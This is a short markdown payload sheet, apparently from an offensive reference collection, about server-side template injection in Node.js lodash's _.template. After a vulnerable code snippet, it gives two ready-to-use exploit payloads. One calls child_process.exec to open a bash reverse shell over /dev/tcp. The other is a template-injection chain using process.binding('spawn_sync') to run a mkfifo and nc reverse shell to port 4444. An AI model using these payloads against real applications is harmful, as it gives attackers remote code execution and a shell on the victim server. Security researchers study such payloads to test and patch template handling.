# NodeJs lodash

## Installation

`$ npm install lodash`

## Vulnerable Source

```nodejs
const _ = require('lodash');
_.template(`hello ${<code-here>}`)();
```

## Exploit

```nodejs
require("child_process").exec("bash -c \\"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\\"")

${x=Object}${w=a=new x}${w.type="pipe"}${w.readable=1}${w.writable=1}${a.file="/bin/sh"}${a.args=["/bin/sh","-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f"]}${a.stdio=[w,w]}${process.binding("spawn_sync").spawn(a).output}
```

